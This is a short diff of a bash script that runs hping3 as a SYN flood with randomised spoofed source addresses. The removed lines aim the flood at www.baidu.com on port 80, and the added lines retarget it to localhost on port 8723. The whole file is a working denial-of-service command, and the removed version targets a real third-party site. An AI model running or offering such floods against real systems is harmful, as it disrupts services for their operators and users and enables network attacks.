@@ -1,5 +1,5 @@
 #! /bin/bash
 
 
-TARGET=www.baidu.com
-sudo hping3 --rand-source $TARGET -S -q -p 80 --flood
+TARGET=127.0.0.1
+sudo hping3 -c 1000 -d 120 -w 64 --rand-source $TARGET -S -q -p 8723 --flood
